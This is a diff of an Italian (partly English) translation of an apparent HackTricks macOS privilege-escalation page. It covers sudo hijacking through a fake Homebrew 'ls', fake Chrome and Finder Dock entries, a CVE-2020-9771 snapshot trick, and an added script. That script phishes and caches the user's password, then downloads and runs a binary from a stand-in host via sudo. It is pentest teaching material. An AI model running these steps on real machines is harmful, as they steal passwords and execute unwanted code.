@@ -4,7 +4,8 @@
 
 ## TCC Privilege Escalation
 
-Se sei arrivato qui cercando l'escalation dei privilegi TCC vai a:
+If you came here looking for TCC privilege escalation go to:
+
 
 {{#ref}}
 macos-security-protections/macos-tcc/
@@ -12,19 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Si prega di notare che **la maggior parte dei trucchi sull'escalation dei privilegi che riguardano Linux/Unix influenzeranno anche le macchine MacOS**. Quindi vedi:
+Si noti che **la maggior parte dei trucchi riguardanti la privilege escalation che interessano Linux/Unix influenzeranno anche i sistemi MacOS**. Quindi vedi:
+
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
 {{#endref}}
 
-## Interazione dell'Utente
+## Interazione con l'utente
 
 ### Sudo Hijacking
 
-Puoi trovare la tecnica originale di [Sudo Hijacking all'interno del post sull'escalation dei privilegi di Linux](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+Puoi trovare l'originale [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
 
-Tuttavia, macOS **mantiene** il **`PATH`** dell'utente quando esegue **`sudo`**. Il che significa che un altro modo per realizzare questo attacco sarebbe **di dirottare altri binari** che la vittima eseguirà quando **esegue sudo:**
+Tuttavia, macOS **mantiene** la **`PATH`** dell'utente quando esegue **`sudo`**. Ciò significa che un altro modo per realizzare questo attacco sarebbe **hijack other binaries** che la vittima eseguirà quando **running sudo:**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
@@ -39,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Nota che un utente che utilizza il terminale avrà molto probabilmente **Homebrew installato**. Quindi è possibile dirottare i binari in **`/opt/homebrew/bin`**.
+Nota che un utente che usa il terminale avrà molto probabilmente **Homebrew installed**. Quindi è possibile dirottare i binari in **`/opt/homebrew/bin`**.
 
-### Impersonificazione del Dock
+### Dock Impersonation
 
-Utilizzando un po' di **ingegneria sociale** potresti **impersonare ad esempio Google Chrome** all'interno del dock ed eseguire effettivamente il tuo script:
+Usando un po' di **social engineering** potresti **impersonate for example Google Chrome** inside the Dock ed effettivamente eseguire il tuo script:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
 Alcuni suggerimenti:
 
-- Controlla nel Dock se c'è un Chrome e, in tal caso, **rimuovi** quella voce e **aggiungi** la **voce falsa** **Chrome nella stessa posizione** nell'array del Dock.
+- Controlla nel Dock se è presente un Chrome e, in tal caso **rimuovi** quella voce e **aggiungi** la **fake** **Chrome entry in the same position** in the Dock array.
 ```bash
 #!/bin/sh
 
@@ -124,11 +126,11 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 Alcuni suggerimenti:
 
-- Non **puoi rimuovere Finder dal Dock**, quindi se intendi aggiungerlo al Dock, potresti mettere il Finder falso proprio accanto a quello reale. Per questo devi **aggiungere l'entrata del Finder falso all'inizio dell'array del Dock**.
-- Un'altra opzione è non posizionarlo nel Dock e semplicemente aprirlo, "Finder che chiede di controllare Finder" non è così strano.
-- Un'altra opzione per **escalare a root senza chiedere** la password con una brutta finestra, è far sì che Finder chieda realmente la password per eseguire un'azione privilegiata:
-- Chiedi a Finder di copiare in **`/etc/pam.d`** un nuovo file **`sudo`** (Il prompt che chiede la password indicherà che "Finder vuole copiare sudo")
-- Chiedi a Finder di copiare un nuovo **Authorization Plugin** (Puoi controllare il nome del file in modo che il prompt che chiede la password indichi che "Finder vuole copiare Finder.bundle")
+- **Non puoi rimuovere Finder dal Dock**, quindi se intendi aggiungerlo al Dock puoi mettere il Finder falso accanto a quello reale. Per farlo devi **aggiungere la voce del Finder falso all'inizio dell'array Dock**.
+- Un'altra opzione è non posizionarlo nel Dock e semplicemente aprirlo, "Finder asking to control Finder" non è così strano.
+- Un'altra opzione per **escalate to root without asking** è far sì che Finder chieda realmente la password per eseguire un'azione privilegiata:
+- Chiedere a Finder di copiare in **`/etc/pam.d`** un nuovo file **`sudo`** (la richiesta della password indicherà che "Finder wants to copy sudo")
+- Chiedere a Finder di copiare un nuovo **Authorization Plugin** (Puoi controllare il nome del file così la richiesta della password indicherà che "Finder wants to copy Finder.bundle")
 ```bash
 #!/bin/sh
 
@@ -201,12 +203,33 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-## TCC - Escalazione dei privilegi di root
+### Password prompt phishing + sudo reuse
 
-### CVE-2020-9771 - bypass TCC di mount_apfs e escalation dei privilegi
+Malware frequentemente sfrutta l'interazione dell'utente per **capture a sudo-capable password** e riutilizzarla programmaticamente. Un flusso comune:
 
-**Qualsiasi utente** (anche quelli non privilegiati) può creare e montare uno snapshot di Time Machine e **accedere a TUTTI i file** di quello snapshot.\
-L'**unico privilegio** necessario è che l'applicazione utilizzata (come `Terminal`) abbia accesso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), che deve essere concesso da un amministratore.
+1. Identificare l'utente connesso con `whoami`.
+2. **Loop password prompts** fino a quando `dscl . -authonly "$user" "$pw"` restituisce successo.
+3. Memorizzare la credenziale nella cache (es., `/tmp/.pass`) ed eseguire azioni privilegiate con `sudo -S` (password via stdin).
+
+Esempio di catena minima:
+```bash
+user=$(whoami)
+while true; do
+read -s -p "Password: " pw; echo
+dscl . -authonly "$user" "$pw" && break
+done
+printf '%s\n' "$pw" > /tmp/.pass
+curl -o /tmp/update https://example.com/update
+printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
+```
+La password rubata può poi essere riutilizzata per **rimuovere la quarantena di Gatekeeper con `xattr -c`**, copiare LaunchDaemons o altri file privilegiati, ed eseguire ulteriori fasi in modo non interattivo.
+
+## TCC - Root Privilege Escalation
+
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+
+**Qualsiasi utente** (anche non privilegiato) può creare e montare uno snapshot di Time Machine e **accedere a TUTTI i file** di quello snapshot.\
+L'**unico privilegio** richiesto è che l'applicazione utilizzata (come `Terminal`) abbia **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), che deve essere concesso da un amministratore.
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -226,15 +249,19 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-Una spiegazione più dettagliata può essere [**trovata nel rapporto originale**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+Una spiegazione più dettagliata può essere [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
-## Informazioni Sensibili
+## Informazioni sensibili
 
-Questo può essere utile per elevare i privilegi:
+Questo può essere utile per escalate privileges:
 
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## Riferimenti
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../../banners/hacktricks-training.md}}
